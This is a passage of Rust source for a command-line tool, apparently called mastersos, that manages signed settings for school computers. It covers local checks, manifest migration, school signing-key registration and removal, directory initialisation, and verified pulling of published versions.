    let names: Vec<String> = names.into_iter().collect();
    let flags: Vec<String> = names
        .iter()
        .map(|n| format!("--allow-reroute={n}"))
        .collect();
    Some(format!(
        "\n!! SECRET REROUTED: {} would be sent to a changed network.\n!! `mastersos publish` refuses until IT checks the change (`mastersos diff`) and approves it:\n!!   mastersos publish {}\n!! Only IT decides this; an AI assistant never passes --allow-reroute.",
        names.join(", "),
        flags.join(" ")
    ))
}

/// `mastersos check`: the lints of the local directory; exit code 2 when any is an error.
fn local_check(dir: Option<&Path>, pins: &Path, json: bool) -> Result<ExitCode, OpError> {
    let lints = workdir::check(&open_dir(dir, pins)?).map_err(fail)?;
    if json {
        println!("{}", crate::tools::check_result(&lints));
    } else {
        print_issues(&lint_values(&lints));
        if let Some(n) = reroute_notice(&lints) {
            println!("{n}");
        }
    }
    Ok(if mastersos_bundle::has_errors(&lints) {
        ExitCode::from(2)
    } else {
        ExitCode::SUCCESS
    })
}

/// `mastersos diff`.
fn local_diff(dir: Option<&Path>, pins: &Path) -> Result<ExitCode, OpError> {
    print!("{}", workdir::diff(&open_dir(dir, pins)?).map_err(fail)?);
    Ok(ExitCode::SUCCESS)
}

/// The local directory's manifest.toml, as text and parsed as a draft (`version` and `issued_at`
/// may be left out). A text that does not parse is refused with its issue.
fn local_manifest(
    dir: Option<&Path>,
) -> Result<(Workdir, String, mastersos_bundle::Manifest), OpError> {
    let w = Workdir::open(dir.unwrap_or_else(|| Path::new("."))).map_err(fail)?;
    let text = w.manifest().map_err(fail)?;
    let m = mastersos_bundle::check::parse_draft(&text).map_err(|l| OpError::Refused {
        message: "manifest.toml does not parse (see `mastersos check`)".into(),
        issues: Some(lint_values(&[l])),
    })?;
    Ok((w, text, m))
}

/// `mastersos explain user` and `mastersos explain device`.
fn explain(c: &ExplainCmd, json: bool) -> Result<ExitCode, OpError> {
    match c {
        ExplainCmd::User {
            dir,
            kind,
            admin,
            user,
            org_role,
            class_role,
            class,
            org_node,
            age_band,
            sub,
            device_group,
        } => {
            // As on a Device (`guest_user_config`): the guest session is never an administrator.
            if *kind == Kind::Guest && *admin {
                return Err(OpError::Failed(
                    "--admin does not apply to --kind guest: the guest session is never an administrator on a Device".into(),
                ));
            }
            let (_, text, m) = local_manifest(dir.as_deref())?;
            if let Some(g) = device_group {
                if !m.groups.iter().any(|x| &x.id == g) {
                    return Err(OpError::Failed(format!(
                        "there is no Group {g:?} in manifest.toml"
                    )));
                }
            }
            if m.user_layer.as_ref().is_some_and(|u| u.fallback.is_none()) {
                let loc = mastersos_bundle::check::Locator::new(&text);
                let issues: Vec<_> = m
                    .validate_all(&Default::default())
                    .into_iter()
                    .filter(|l| l.code == "user_fallback_missing")
                    .map(|mut l| {
                        if let (Some(loc), Some(p)) = (&loc, &l.path) {
                            l.span = loc.locate(p);
                        }
                        l
                    })
                    .collect();
                return Err(OpError::Refused {
                    message: "manifest.toml has no [user] fallback (see `mastersos check`)".into(),
                    issues: Some(lint_values(&issues)),
                });
            }
            let classes = explain_mod::class_facts(class, class_role).map_err(OpError::Failed)?;
            let any_fact = org_role.is_some()
                || !classes.is_empty()
                || !org_node.is_empty()
                || age_band.is_some()
                || sub.is_some();
            if any_fact && *kind != Kind::Sso {
                eprintln!(
                    "mastersos: issuer facts count only for sso accounts; they are ignored here"
                );
            }
            // As on a Device (design §5): without `mastersos_claims = true` the issuer sends no
            // facts, so fact conditions never match.
            let claims = m.school.oidc.as_ref().is_some_and(|o| o.mastersos_claims);
            if any_fact && *kind == Kind::Sso && !claims {
                eprintln!("mastersos: fact flags ignored: school.oidc.mastersos_claims is not true, so Devices receive no facts");
            }
            let facts =
                (any_fact && *kind == Kind::Sso && claims).then(|| mastersos_bundle::IssuerFacts {
                    sub: sub.clone().unwrap_or_default(),
                    org: m.school.id.clone().unwrap_or_default(),
                    org_role: *org_role,
                    org_nodes: org_node.clone(),
                    classes,
                    age_band: *age_band,
                });
            let q = UserQuery {
                kind: *kind,
                admin: *admin,
                // A Device signs the guest session in as user "guest".
                user: user.clone().unwrap_or_else(|| {
                    if *kind == Kind::Guest {
                        "guest".into()
                    } else {
                        String::new()
                    }
                }),
                facts,
            };
            let out = explain_mod::explain_user(&m, &text, &q, device_group.as_deref());
            if let Some(e) = out
                .iter()
                .find(|e| mastersos_bundle::user_config(&m, &e.user_config).is_none())
            {
                return Err(OpError::Failed(format!(
                    "Group {:?} gives user config {:?}, which does not exist (see `mastersos check`)",
                    e.group, e.user_config
                )));
            }
            if json {
                println!("{}", serde_json::to_value(&out).map_err(fail)?);
                return Ok(ExitCode::SUCCESS);
            }
            for e in &out {
                let why = match (e.rule, e.line) {
                    _ if m.user_layer.is_none() => format!("implied: format {}", m.format),
                    (Some(i), Some(l)) => format!("rule assign[{i}], manifest.toml:{l}"),
                    (Some(i), None) => format!("rule assign[{i}]"),
                    (None, _) => "fallback".into(),
                };
                println!("group {}: {} ({why})", e.group, e.user_config);
            }
            Ok(ExitCode::SUCCESS)
        }
        ExplainCmd::Device { serial, dir } => {
            let (_, _, m) = local_manifest(dir.as_deref())?;
            let d = explain_mod::explain_device(&m, serial).map_err(OpError::Failed)?;
            if json {
                println!("{}", serde_json::to_value(&d).map_err(fail)?);
                return Ok(ExitCode::SUCCESS);
            }
            let list = |v: &[String]| {
                if v.is_empty() {
                    "(none)".to_owned()
                } else {
                    v.join(", ")
                }
            };
            let how = match d.source {
                mastersos_bundle::GroupSource::Bundle => "its [[device]] entry",
                _ => "no [[device]] entry: the default Group",
            };
            println!("group: {} ({how})", d.group);
            println!("device config: {}", d.device_config);
            println!("user configs: {}", list(&d.user_configs));
            println!("flatpak: {}", list(&d.flatpak));
            println!("deb: {}", list(&d.deb));
            Ok(ExitCode::SUCCESS)
        }
    }
}

/// What `mastersos migrate` tells IT on stderr about the format 3 text.
fn migrate_notes(legacy: bool) -> String {
    let mut notes = vec![
        "The keys that moved into [[device_config]], [[user_config]] and the defaults lose their comments.",
        "Every Device also installs the Flatpak and .deb apps of the fallback user config (the default Group's), legacy browser Groups included; once Devices run a format 3 agent, those apps show in the Dash only where a user config lists them.",
        "Publishing a format 3 text is refused (`feature_unsupported` for `format_3`, or `format_unsupported`) until every Device seen in the last 30 days reports `format_3`; the refusal names the Devices that are too old.",
    ];
    if legacy {
        notes.push("The settings were in the legacy shape (Groups holding the settings): the secret references now belong to configs, so the first publish needs `--allow-reroute` for each secret it names.");
    }
    notes.iter().map(|n| format!("note: {n}\n")).collect()
}

/// `mastersos migrate`: the format 3 text on stdout (or written with `--write`), then the local
/// check of that text; exit code 2 when the check finds errors or the text is already format 3.
fn migrate(dir: Option<&Path>, pins: &Path, write: bool, json: bool) -> Result<ExitCode, OpError> {
    let w = open_dir(dir, pins)?;
    let text = w.manifest().map_err(fail)?;
    let new = mastersos_bundle::migrate::to_format3(&text).map_err(|e| match e {
        mastersos_bundle::migrate::MigrateError::AlreadyFormat3 => OpError::Refused {
            message: e.to_string(),
            issues: None,
        },
        e => fail(e),
    })?;
    let legacy = mastersos_bundle::check::parse_draft(&text)
        .is_ok_and(|m| m.shape == mastersos_bundle::Shape::Legacy);
    let lints = if write {
        w.write_manifest(&new).map_err(fail)?;
        workdir::check(&w).map_err(fail)?
    } else {
        workdir::check_manifest(&w, &new).map_err(fail)?
    };
    if json {
        let mut v = json!({
            "written": write,
            "check": crate::tools::check_result(&lints),
        });
        if !write {
            v["text"] = Value::String(new);
        }
        println!("{v}");
    } else {
        let mut report = issues_text(&lint_values(&lints));
        if let Some(n) = reroute_notice(&lints) {
            report.push_str(&format!("{n}\n"));
        }
        if write {
            println!(
                "Wrote format 3 settings to {}.",
                w.root.join("manifest.toml").display()
            );
            print!("{report}");
        } else {
            // stdout holds only the text, so it can be redirected to a file.
            print!("{new}");
            eprint!("{report}");
        }
    }
    eprint!("{}", migrate_notes(legacy));
    Ok(if mastersos_bundle::has_errors(&lints) {
        ExitCode::from(2)
    } else {
        ExitCode::SUCCESS
    })
}

/// The school id and name the server says this token belongs to (the name for messages only; the
/// host when there is none).
async fn school_info(api: &Api, server: &str) -> Result<(String, String), OpError> {
    let text = api.send(Req::get(&["v1", "auth", "config"])).await?;
    let v: Value = serde_json::from_str(&text).map_err(fail)?;
    let id = v["school_id"]
        .as_str()
        .map(str::to_owned)
        .ok_or_else(|| OpError::Failed("the server did not say which school this is".into()))?;
    let name = v["name"]
        .as_str()
        .map(|n| {
            n.chars()
                .filter(|c| !c.is_control())
                .take(64)
                .collect::<String>()
        })
        .filter(|n| !n.trim().is_empty())
        .unwrap_or_else(|| {
            reqwest::Url::parse(server)
                .ok()
                .and_then(|u| u.host_str().map(str::to_owned))
                .unwrap_or_else(|| "this school".to_owned())
        });
    Ok((id, name))
}

fn sign_api(server: &str, token_file: &Path) -> Result<crate::sign::Api, OpError> {
    crate::sign::Api::from_token_file(server, token_file).map_err(fail)
}

/// Whether two server addresses name the same server: compared as URLs (scheme, host in lower
/// case, port, path without a trailing `/`), not as text.
fn same_server(a: &str, b: &str) -> bool {
    fn norm(s: &str) -> Option<(String, String, Option<u16>, String)> {
        let u = reqwest::Url::parse(s.trim()).ok()?;
        Some((
            u.scheme().to_owned(),
            u.host_str()?.to_ascii_lowercase(),
            u.port_or_known_default(),
            u.path().trim_end_matches('/').to_owned(),
        ))
    }
    match (norm(a), norm(b)) {
        (Some(x), Some(y)) => x == y,
        _ => a == b,
    }
}

/// A school key file read for `init` or `key add`.
struct SchoolKey {
    kit: mastersos_bundle::kit::Kit,
}

impl SchoolKey {
    fn code(&self) -> String {
        workdir::shown_code(&self.kit.key_id())
    }
}

/// Read the school key files (one key given twice counts once).
fn load_school_keys(paths: &[PathBuf]) -> Result<Vec<SchoolKey>, OpError> {
    let mut out: Vec<SchoolKey> = Vec::new();
    for p in paths {
        let kit = crate::sign::kit::load_key_file(p).map_err(fail)?;
        if !out.iter().any(|k| k.kit.key_id() == kit.key_id()) {
            out.push(SchoolKey { kit });
        }
    }
    Ok(out)
}

/// `GET /v1/admin/signing-keys`, as far as the command line reads it.
#[derive(Deserialize)]
struct ListedKey {
    key_id: String,
    #[serde(default)]
    alg: String,
    #[serde(default)]
    public_key: String,
    #[serde(default)]
    label: String,
    #[serde(default)]
    created_at: Option<String>,
    #[serde(default)]
    in_published_trust: bool,
}

/// `GET /v1/admin/escrow-recipients`, as far as the command line reads it.
#[derive(Deserialize)]
struct ListedRecipient {
    recipient: String,
    #[serde(default)]
    bound_key_id: Option<String>,
}

async fn get_list<T: serde::de::DeserializeOwned>(
    api: &Api,
    what: &str,
) -> Result<Vec<T>, OpError> {
    let text = api.send(Req::get(&["v1", "admin", what])).await?;
    serde_json::from_str(&text)
        .map_err(|e| OpError::Failed(format!("the server's list of {what} cannot be read: {e}")))
}

/// Every school key must be registered for this school: its public key among the registered
/// signing keys (compared by key, not by id or label) and its recipient among the registered
/// recipients. The server's lists only answer yes or no; nothing from them is written.
async fn ensure_registered(
    api: &Api,
    school_keys: &[SchoolKey],
    school: &str,
) -> Result<(), OpError> {
    let keys: Vec<ListedKey> = get_list(api, "signing-keys").await?;
    let recipients: Vec<ListedRecipient> = get_list(api, "escrow-recipients").await?;
    for k in school_keys {
        let tk = k.kit.trust_key();
        let recipient = k.kit.escrow_recipient();
        let key_ok = keys
            .iter()
            .any(|l| l.alg == tk.alg.as_str() && l.public_key == tk.public_key);
        let recipient_ok = recipients.iter().any(|r| r.recipient == recipient);
        if !key_ok || !recipient_ok {
            return Err(OpError::Failed(format!(
                "This school key ({}) is not registered for {school}. Register it first with `mastersos key register --key-file <file> --label <name>`.",
                k.code()
            )));
        }
    }
    Ok(())
}

fn absolute(p: &Path) -> Result<PathBuf, OpError> {
    std::path::absolute(p).map_err(|e| OpError::Failed(format!("Bad path {}: {e}", p.display())))
}

/// `Trusted keys: 11d9-03eb, 7c42-a915` for this manifest.
fn trusted_line(manifest_text: &str) -> Result<String, OpError> {
    let codes: Vec<String> = workdir::trusted_keys(manifest_text)
        .map_err(fail)?
        .iter()
        .map(|k| workdir::shown_code(&k.id))
        .collect();
    Ok(format!("Trusted keys: {}", codes.join(", ")))
}

const PUBLISH_NEXT: &str =
    "Now publish with a school key that is already trusted: mastersos publish --key-file <file>";

/// The settings directory the `keys` commands edit; it must belong to this server and school.
async fn keys_dir(
    api: &Api,
    server: &str,
    dir: Option<&Path>,
) -> Result<(Workdir, String), OpError> {
    let w = Workdir::open(dir.unwrap_or_else(|| Path::new("."))).map_err(fail)?;
    let m = w.meta().map_err(fail)?;
    let (id, name) = school_info(api, server).await?;
    if m.school_id != id || !same_server(&m.server, server) {
        return Err(OpError::Failed(format!(
            "{} belongs to school {} on {}, not to {id} on {server}",
            absolute(&w.root)?.display(),
            m.school_id,
            m.server
        )));
    }
    Ok((w, name))
}

/// `mastersos key add <FILE>`: only the local manifest.toml changes.
async fn keys_add(
    api: &Api,
    server: &str,
    dir: Option<&Path>,
    school_keys: &[SchoolKey],
) -> Result<ExitCode, OpError> {
    let (w, name) = keys_dir(api, server, dir).await?;
    ensure_registered(api, school_keys, &name).await?;
    let mut text = w.manifest().map_err(fail)?;
    for k in school_keys {
        text = workdir::add_trusted_key(&text, &k.kit.trust_key(), &k.kit.escrow_recipient())
            .map_err(fail)?;
    }
    w.write_manifest(&text).map_err(fail)?;
    let path = absolute(&w.root.join("manifest.toml"))?;
    for k in school_keys {
        println!("Added school key {} to {}.", k.code(), path.display());
    }
    println!("{}", trusted_line(&text)?);
    println!("{PUBLISH_NEXT}");
    Ok(ExitCode::SUCCESS)
}

/// `mastersos key remove <KEY CODE> [--key-file <PATH>]`: only local data decides what is
/// removed. The disk-unlocking entry goes when its `# school key <code>` comment ties it to the
/// key, or when it is the one derived from the key's own file. Entries without either are listed
/// for IT; when this computer is connected, the server's word on each is shown beside it, and
/// nothing is removed on that basis.
async fn keys_remove(
    dir: Option<&Path>,
    code: &str,
    key_file: Option<&Path>,
    server: Option<&str>,
    token_file: Option<&Path>,
) -> Result<ExitCode, OpError> {
    let file = match key_file {
        Some(p) => {
            let kit = crate::sign::kit::load_key_file(p).map_err(fail)?;
            let file_code = workdir::shown_code(&kit.key_id());
            match workdir::normalize_key_code(code) {
                Some(want) if want == file_code => {}
                // A code that is not a key code is refused below with its own message.
                None => {}
                Some(want) => {
                    return Err(OpError::Failed(format!(
                        "{} is school key {file_code}, not {want}. Nothing was changed.",
                        absolute(p)?.display()
                    )))
                }
            }
            Some(kit)
        }
        None => None,
    };
    let w = Workdir::open(dir.unwrap_or_else(|| Path::new("."))).map_err(fail)?;
    let recipient = file.as_ref().map(|k| k.escrow_recipient());
    let r = workdir::remove_school_key(&w.manifest().map_err(fail)?, code, recipient.as_deref())
        .map_err(fail)?;
    let path = absolute(&w.root.join("manifest.toml"))?;
    let shown = workdir::shown_code(&r.key_id);
    if let Some(k) = &file {
        if k.key_id() != r.key_id {
            return Err(OpError::Failed(format!(
                "manifest.toml has a school key {shown} that does not match {}. Check which file is the right one. Nothing was changed.",
                absolute(key_file.unwrap_or(Path::new("")))?.display()
            )));
        }
    }
    w.write_manifest(&r.text).map_err(fail)?;
    println!("Removed school key {shown} from {}.", path.display());
    if file.is_none() && !r.recipient_removed && !r.unmarked.is_empty() {
        let said = server_says(&w, server, token_file).await;
        println!(
            "manifest.toml has disk-unlocking entries (under [school]) that this command could not match to {shown}:"
        );
        for u in &r.unmarked {
            match said.get(u) {
                Some(c) => println!("  {u}  (the server says: school key {c})"),
                None => println!("  {u}"),
            }
        }
        println!(
            "If you still have that key's file, run again with --key-file <file>: mastersos key remove {shown} --key-file <file>"
        );
        println!("Otherwise remove the one that belonged to {shown} by hand.");
    }
    println!("{}", trusted_line(&r.text)?);
    println!("{PUBLISH_NEXT}");
    Ok(ExitCode::SUCCESS)
}

/// Text from the server, without control characters, for a terminal.
fn printable(s: &str) -> String {
    s.chars().filter(|c| !c.is_control()).collect()
}

/// Best effort, for display only: the key code the server binds each disk-unlocking entry to,
/// when this computer is connected to the folder's own school. Any failure gives nothing.
async fn server_says(
    w: &Workdir,
    server: Option<&str>,
    token_file: Option<&Path>,
) -> std::collections::HashMap<String, String> {
    let fetch = async {
        let cfg = load_config().ok()?;
        let server = server.map(str::to_owned).or(cfg.server)?;
        let token_file = match token_file.map(Path::to_path_buf).or(cfg.token_file) {
            Some(p) => p,
            None => config_dir().ok()?.join("token"),
        };
        crate::platform::check_private(&token_file).ok()?;
        let m = w.meta().ok()?;
        if !same_server(&m.server, &server) {
            return None;
        }
        let api = connect(&server, &token_file).await.ok()?;
        let (id, _) = school_info(&api, &server).await.ok()?;
        if id != m.school_id {
            return None;
        }
        let listed: Vec<ListedRecipient> = get_list(&api, "escrow-recipients").await.ok()?;
        Some(
            listed
                .into_iter()
                .filter_map(|l| {
                    let code = printable(&workdir::shown_code(&l.bound_key_id?));
                    (!code.is_empty()).then_some((l.recipient, code))
                })
                .collect(),
        )
    };
    tokio::time::timeout(std::time::Duration::from_secs(15), fetch)
        .await
        .ok()
        .flatten()
        .unwrap_or_default()
}

/// `mastersos key list`: the registered school keys, and whether the local directory has each.
async fn keys_list(api: &Api, out: &Out, dir: Option<&Path>) -> Result<ExitCode, OpError> {
    let local: Option<Vec<mastersos_bundle::TrustKey>> = match dir {
        Some(d) => {
            let w = Workdir::open(d).map_err(fail)?;
            Some(workdir::trusted_keys(&w.manifest().map_err(fail)?).map_err(fail)?)
        }
        None => match Workdir::open(Path::new(".")) {
            Ok(w) => workdir::trusted_keys(&w.manifest().map_err(fail)?).ok(),
            Err(_) => None,
        },
    };
    let text = api.send(Req::get(&["v1", "admin", "signing-keys"])).await?;
    let in_folder = |public_key: &str| {
        local
            .as_ref()
            .map(|l| l.iter().any(|k| k.public_key == public_key))
    };
    if out.json {
        let mut v: Value = serde_json::from_str(&text).map_err(fail)?;
        if let Value::Array(items) = &mut v {
            for i in items {
                let here = in_folder(i["public_key"].as_str().unwrap_or_default());
                i["in_this_folder"] = json!(here);
            }
        }
        println!("{v}");
        return Ok(ExitCode::SUCCESS);
    }
    let keys: Vec<ListedKey> = serde_json::from_str(&text).map_err(|e| {
        OpError::Failed(format!(
            "the server's list of signing-keys cannot be read: {e}"
        ))
    })?;
    let yes_no = |b: bool| if b { "yes" } else { "no" }.to_owned();
    let rows = keys
        .iter()
        .map(|k| {
            vec![
                printable(&workdir::shown_code(&k.key_id)),
                printable(&k.label),
                k.created_at
                    .as_deref()
                    .map_or("-".into(), |t| printable(t).chars().take(10).collect()),
                yes_no(k.in_published_trust),
                in_folder(&k.public_key).map_or("-".into(), yes_no),
            ]
        })
        .collect();
    println!(
        "{}",
        table(
            &[
                "KEY CODE",
                "LABEL",
                "REGISTERED",
                "PUBLISHED",
                "IN THIS FOLDER"
            ],
            rows
        )
    );
    Ok(ExitCode::SUCCESS)
}

// —— Protocol v1: init, pull, verify ——

/// The global options the protocol v1 commands use.
struct V1 {
    json: bool,
    yes: bool,
    server: Option<String>,
    pin_flag: Option<PathBuf>,
    /// `--trust-fingerprint`.
    fingerprints: Vec<String>,
}

impl V1 {
    /// The first-use anchors of a command without a school key file: the fingerprints given, or
    /// a person at a terminal (not with `--yes` or `--json`).
    fn anchors(&self) -> crate::sign::chain::Anchors {
        use std::io::IsTerminal as _;
        crate::sign::chain::Anchors {
            keys: Vec::new(),
            fingerprints: self.fingerprints.clone(),
            interactive: !self.yes && !self.json && std::io::stdin().is_terminal(),
        }
    }
}

/// Run `init`, `pull` or `verify`: what to print on stdout, or the error. With `--json` the
/// dialogue (fingerprints, chain notes) goes to stderr and stdout holds one JSON value.
async fn v1_command(o: &V1, cmd: Cmd) -> Result<String, CliError> {
    use std::io::IsTerminal as _;
    // School key files first: `--key-file -` reads stdin, before the dialogue holds it.
    let keys = match &cmd {
        Cmd::Init { key_file, .. } if key_file.is_empty() => {
            return Err(CliError::usage(
                "mastersos init needs a school key file: --key-file <PATH>. Make one with: mastersos key new --out <FOLDER> --school <name>, then register it with mastersos key register --key-file <PATH> --label <name>.",
            ))
        }
        Cmd::Init { key_file, .. } => load_school_keys(key_file)
            .map_err(|e| CliError::new("key_file_invalid", e.message()))?,
        _ => Vec::new(),
    };
    let stdin = std::io::stdin();
    let interactive = !o.yes && !o.json && stdin.is_terminal();
    let mut confirm = stdin.lock();
    let (mut stdout, mut stderr) = (std::io::stdout(), std::io::stderr());
    let out: &mut dyn std::io::Write = if o.json { &mut stderr } else { &mut stdout };
    match cmd {
        Cmd::Init { dir, school, .. } => {
            init_v1(
                o,
                &dir,
                keys,
                school.as_deref(),
                interactive,
                &mut confirm,
                out,
            )
            .await
        }
        Cmd::Pull {
            dir,
            version,
            force,
            school,
        } => {
            let dir = dir.unwrap_or_else(|| PathBuf::from("."));
            pull_v1(
                o,
                &dir,
                version,
                force,
                school.as_deref(),
                &mut confirm,
                out,
            )
            .await
        }
        Cmd::Verify { school } => verify_v1(o, school.as_deref(), &mut confirm, out).await,
        _ => Err(CliError::usage("not a protocol v1 command")),
    }
}

/// A local file problem; the message names the file, never its content.
fn local_file(e: impl std::fmt::Display) -> CliError {
    CliError::new("local_file", &crate::safe::text(&format!("{e:#}")))
}

/// The origin of a server address, as `--server` takes it.
fn origin_of(s: &str) -> Result<String, CliError> {
    Ok(crate::server::check_origin(s)?
        .origin()
        .ascii_serialization())
}

/// The `mastersos.toml` of `dir`, when it is a settings directory. Its server must be an origin
/// and its school a lowercase UUID: a directory of the old admin API is refused.
fn dir_meta(dir: &Path) -> Result<Option<Meta>, CliError> {
    match std::fs::symlink_metadata(dir.join("mastersos.toml")) {
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        _ => {}
    }
    let m = Workdir::open(dir)
        .and_then(|w| w.meta())
        .map_err(local_file)?;
    let old = || {
        CliError::new(
            "local_file",
            &format!(
                "{} is from an older version of mastersos (its server is not an origin, or its school id is not a lowercase UUID): pull into a new directory",
                dir.join("mastersos.toml").display()
            ),
        )
    };
    if origin_of(&m.server).map_err(|_| old())? != m.server
        || !crate::server::is_school_id(&m.school_id)
    {
        return Err(old());
    }
    Ok(Some(m))
}

/// The credentials and the server origin: `--server`, else the directory's server, else the one
/// the credentials name. The credentials must be for that server.
async fn resolve_v1(
    o: &V1,
    meta: Option<&Meta>,
) -> Result<(crate::auth::Credentials, String), CliError> {
    let flag = o.server.as_deref().map(origin_of).transpose()?;
    if let (Some(f), Some(m)) = (&flag, meta) {
        if *f != m.server {
            return Err(CliError::new(
                "school_mismatch",
                &format!("the directory belongs to {}, not to {f}", m.server),
            ));
        }
    }
    let wanted = flag.or_else(|| meta.map(|m| m.server.clone()));
    let (creds, named) = crate::auth::resolve(wanted.as_deref()).await?;
    let origin = wanted.or(named).ok_or_else(|| {
        CliError::new(
            "not_configured",
            "no server: pass --server <URL>, or sign in with `mastersos login --server <URL>`",
        )
    })?;
    Ok((creds, origin))
}

/// The school `--school` names, else the directory's; they must agree.
fn school_of(flag: Option<&str>, meta: Option<&Meta>) -> Result<String, CliError> {
    match (flag, meta) {
        (Some(f), Some(m)) if f != m.school_id => Err(CliError::new(
            "school_mismatch",
            &format!(
                "the directory belongs to school {}, not to {f}",
                m.school_id
            ),
        )),
        (Some(f), _) => Ok(f.to_owned()),
        (None, Some(m)) => Ok(m.school_id.clone()),
        (None, None) => Err(CliError::new(
            "not_configured",
            "no school is set: pass --school <UUID>",
        )),
    }
}

/// The school `init` works on when `--school` is not given (R8): none is an error, one is taken,
/// several are asked for by number, or refused with the list when there is no one to ask.
pub(crate) fn choose_school(
    list: Vec<SchoolEntry>,
    interactive: bool,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<SchoolEntry, CliError> {
    let shown = |s: &SchoolEntry| format!("{}  {}", s.id, crate::safe::field(&s.name));
    match list.len() {
        0 => Err(CliError::new(
            "not_configured",
            "this account administers no school",
        )),
        1 => {
            let s = list
                .into_iter()
                .next()
                .ok_or_else(|| CliError::usage("no school"))?;
            writeln!(out, "School: {}", shown(&s)).map_err(local_file)?;
            Ok(s)
        }
        n if !interactive => {
            let mut e = CliError::usage(&format!(
                "this account administers {n} schools: pass --school <UUID> with one of them"
            ));
            e.problems = list
                .iter()
                .map(|s| serde_json::Value::String(shown(s)))
                .collect();
            Err(e)
        }
        n => {
            writeln!(out, "This account administers {n} schools:").map_err(local_file)?;
            for (i, s) in list.iter().enumerate() {
                writeln!(out, "  {}. {}", i + 1, shown(s)).map_err(local_file)?;
            }
            let typed = crate::sign::ask(confirm, out, "Type the number of the school: ")
                .map_err(|_| CliError::new("cancelled", "no school was chosen; cancelled"))?;
            match typed.parse::<usize>() {
                Ok(i) if (1..=n).contains(&i) => Ok(list
                    .into_iter()
                    .nth(i - 1)
                    .ok_or_else(|| CliError::usage("no school"))?),
                _ => Err(CliError::usage(&format!(
                    "{} is not a number from 1 to {n}",
                    crate::safe::field(&typed)
                ))),
            }
        }
    }
}

/// `GET keys`, as far as `init` reads it.
#[derive(Deserialize)]
struct RegisteredKey {
    key_id: String,
    #[serde(default)]
    public_key: String,
    #[serde(default)]
    fingerprint: String,
}

/// `mastersos init DIR --key-file PATH… [--school UUID] [--server URL]`: the trusted keys and the
/// disk-unlocking recipients come from the school key files only; the server is asked only
/// whether each key is registered (same id, public key and fingerprint). Nothing is written when
/// one is not.
async fn init_v1(
    o: &V1,
    dir: &Path,
    keys: Vec<SchoolKey>,
    school: Option<&str>,
    interactive: bool,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    if !workdir::is_free(dir).map_err(local_file)? {
        return Err(CliError::usage(&format!(
            "{} is not empty: init starts a new directory",
            dir.display()
        )));
    }
    let (creds, origin) = resolve_v1(o, None).await?;
    let (school, name) = match school {
        Some(s) => (s.to_owned(), None),
        None => {
            let list = Server::new(&origin, None, creds.clone())?.schools().await?;
            let s = choose_school(list, interactive, confirm, out)?;
            (s.id, Some(s.name))
        }
    };
    let server = Server::new(&origin, Some(&school), creds)?;
    let latest = server.latest_version().await?;
    if latest > 0 {
        return Err(CliError::new(
            "version_conflict",
            &format!(
                "the school already has published settings (version {latest}): use `mastersos pull {}`",
                dir.display()
            ),
        ));
    }
    let registered: Vec<RegisteredKey> = server.get_json("keys").await?;
    for k in &keys {
        let tk = k.kit.trust_key();
        let fp = mastersos_bundle::trust_fingerprint(&tk);
        let ok = registered
            .iter()
            .any(|r| r.key_id == tk.id && r.public_key == tk.public_key && r.fingerprint == fp);
        if !ok {
            return Err(CliError::new(
                "key_not_trusted",
                &format!(
                    "school key {} is not registered for school {school}. Register it first with `mastersos key register --key-file <file> --label <name>`.",
                    k.code()
                ),
            ));
        }
    }
    let pairs: Vec<(mastersos_bundle::TrustKey, String)> = keys
        .iter()
        .map(|k| (k.kit.trust_key(), k.kit.escrow_recipient()))
        .collect();
    let text = workdir::set_trusted_keys(&workdir::template(&school).map_err(local_file)?, &pairs)
        .map_err(local_file)?;
    let meta = Meta {
        server: origin.clone(),
        school_id: school.clone(),
        base_version: 0,
    };
    Workdir::init(dir, meta, &text).map_err(local_file)?;
    let abs = std::path::absolute(dir).map_err(local_file)?;
    let codes: Vec<String> = keys.iter().map(SchoolKey::code).collect();
    if o.json {
        return Ok(format!(
            "{}\n",
            json!({"created": abs.display().to_string(), "server": origin, "school_id": school, "trusted_keys": codes})
        ));
    }
    let whose = match name {
        Some(n) => crate::safe::field(&n),
        None => format!("school {school}"),
    };
    Ok(format!(
        "Created {} for {whose}.\n  manifest.toml  the settings for every computer: edit this file\n  secrets.toml   Wi-Fi passwords and other secrets that manifest.toml names as \"secret:<name>\"; keep it private\n{}\nNext: edit manifest.toml, then run `mastersos check`.\n",
        abs.display(),
        trusted_line(&text).map_err(|e| local_file(e.message()))?
    ))
}

/// `mastersos pull [DIR] [--version N] [--force] [--school UUID] [--server URL]`: the chain is
/// verified from the pin first; an older `--version` is taken only if this computer verified it
/// before (the pin's recorded digest).
async fn pull_v1(
    o: &V1,
    dir: &Path,
    version: Option<u64>,
    force: bool,
    school: Option<&str>,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    // A directory with unpublished changes is refused before the network is touched.
    Workdir::ensure_pullable(dir, force).map_err(|e| CliError::usage(&format!("{e:#}")))?;
    let meta = if force {
        dir_meta(dir).ok().flatten()
    } else {
        dir_meta(dir)?
    };
    let school = school_of(school, meta.as_ref())?;
    let (creds, origin) = resolve_v1(o, meta.as_ref()).await?;
    let server = Server::new(&origin, Some(&school), creds)?;
    let pins = resolve_pin_dir(o.pin_flag.as_deref())?;
    let verified =
        crate::sign::chain::verify_chain((&server).into(), &pins, &o.anchors(), confirm, out)
            .await?;
    let (n, contents) = match version {
        None => (verified.version, verified.contents),
        Some(n) if n == verified.version => (n, verified.contents),
        // Newer than what machines run: refused versions (or none), not something to pull.
        Some(n) if n == 0 || n > verified.version => {
            return Err(CliError::usage(&format!(
            "version {n} cannot be pulled: machines run version {} (the newest published is {})",
            verified.version, verified.latest
        )))
        }
        Some(n) => {
            // Only a version this computer verified before, with the digest it had then.
            crate::sign::chain::recorded_version(&verified.history, n)
                .map_err(|e| CliError::usage(&format!("{e:#}")))?;
            let archive = server.version_archive(n).await?;
            let contents = crate::sign::chain::recorded_contents(&verified.history, n, &archive)
                .map_err(crate::sign::chain::to_cli_error)?;
            (n, contents)
        }
    };
    let manifest = mastersos_bundle::Manifest::parse(&contents.manifest_text).map_err(|e| {
        CliError::new(
            "chain_tampered",
            &format!(
                "version {n}: the manifest cannot be read: {}",
                crate::safe::field(&e.to_string())
            ),
        )
    })?;
    if mastersos_bundle::school_id_mismatch(&manifest, &school).is_some() {
        return Err(CliError::new(
            "school_mismatch",
